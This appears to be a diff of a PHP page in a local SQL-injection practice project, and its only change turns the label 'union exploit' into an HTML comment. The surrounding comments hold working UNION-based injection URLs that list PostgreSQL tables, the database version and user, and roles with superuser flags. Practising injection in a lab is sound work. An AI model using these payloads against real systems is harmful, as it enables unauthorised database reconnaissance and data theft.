@@ -50,7 +50,7 @@ try {
 }
 ?>
 </pre>
-union exploit
+<!-- union exploit -->
 <!-- http://localhost/sqli/?user=x' OR '1'='0' union select 1,table_name,table_schema,table_catalog from information_schema.tables where table_schema='public' order by 4 -- &pwd=beta
 <!-- http://localhost/sqli/?user=x' OR '1'='0' union select 1,version(),current_database(),user -- &pwd=beta -->
 <!-- http://localhost/sqli/?user=x' OR '1'='0' union select 1,rolname,rolsuper::text,rolcanlogin::text FROM pg_roles -- &pwd=beta -->
